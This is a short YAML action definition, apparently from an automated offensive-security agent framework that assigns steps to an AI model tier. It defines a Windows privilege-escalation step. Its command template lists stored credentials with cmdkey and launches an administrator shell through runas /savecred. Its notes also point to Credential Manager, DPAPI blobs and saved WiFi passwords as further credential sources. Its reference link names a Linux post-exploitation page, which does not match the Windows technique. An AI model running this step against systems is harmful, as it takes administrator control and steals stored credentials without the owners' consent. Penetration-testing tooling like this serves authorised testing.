name: stored_credentials
category: privesc
description: Windows stored credentials exploitation
preconditions:
- os==windows
parameters:
  target_ip: from_engagement.target_ip
command_template: cmdkey /list && runas /savecred /user:administrator cmd.exe
parser: null
expected_effects:
- action_completed
falsifier:
  pattern: error|failed|refused|denied
  timeout: 30
model_tier: haiku
mechanism: 'If cmdkey shows stored credentials for admin, runas /savecred uses them
  without prompt. Also check: Credential Manager, DPAPI blobs, saved WiFi passwords.'
hacktricks_ref: linux-hardening/linux-post-exploitation/README.md
